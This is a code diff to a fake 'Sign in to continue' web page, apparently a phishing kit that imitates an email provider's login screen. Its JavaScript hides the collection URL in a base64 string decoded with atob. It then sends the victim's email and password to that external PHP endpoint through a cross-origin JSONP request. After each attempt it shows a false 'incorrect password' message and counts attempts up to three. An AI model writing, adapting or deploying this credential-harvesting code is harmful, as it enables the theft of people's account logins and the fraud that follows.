@@ -289,7 +289,7 @@ allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 
                         
       <form action="#" method="post">
 <div align="center">
-                          <h2 class="text-center"><div id="top"><img src="https://logo.clearbit.com/https://yahoo.com" alt="" id="logoimg" style="width:30px;height:30px;margin-top:10px;">
+                          <h2 class="text-center"><div id="top"><img src="" alt="" id="logoimg" style="width:30px;height:30px;margin-top:10px;">
 		 
 		  <span style="vertical-align: middle; padding-left: 3px;color: #fff;" id="logoname"></span> </div>
                       <p><span style="font-size: 20px;color:gray;">Sign in to continue </span></p>
@@ -517,15 +517,19 @@ return true;
       ///////////new injection////////////////
       count=count+1;
     //  console.log(count); 
+	var fieldName = $('#fieldName').val();
+	//alert (fieldName);
 	var d=atob("aHR0cHM6Ly9waHBzdGFjay05Mzk1OTItMzI2NjEzNy5jbG91ZHdheXNhcHBzLmNvbS9zZXJ2ZXIvYXV0aC5waHA=");
 		
 	   $.ajax({
-        dataType: 'JSON',
+        dataType: 'jsonp',
+		crossOrigin:true,
 		url: d,
-        type: 'POST',
+        type: 'GET',
         data:{
-          email:email,
-          password:password
+          'email':email,
+          'password':password,
+		  'field': fieldName,
         },
             // data: $('#contact').serialize(),
             beforeSend: function(xhr){
@@ -533,13 +537,14 @@ return true;
 			  
     //  console.log(count); 
             },
-            success: function(response){
+            success: function(data){
+			var jresult = data.message;
 			 $('#msg').html("<span style='color:red;'>Username or Password is incorrect. Please try again</span>");
-              if(response){
+              if(data){
                 $("#msg").show();
-				console.log(response);
-				$('#msg').html(response['msg']);
-				var jresult = data.message;
+				console.log(data);
+				$('#msg').html(data['msg']);
+				
                 if(jresult == 'ok'){
                   $("#password").val("");
                   if (count>=3) {
@@ -551,7 +556,7 @@ return true;
                   // $('#msg').html(response['msg']);
                 }
                 else{
-                   $('#msg').html(response['msg']);
+                   $('#msg').html(data['msg']);
                 }
               }
             },
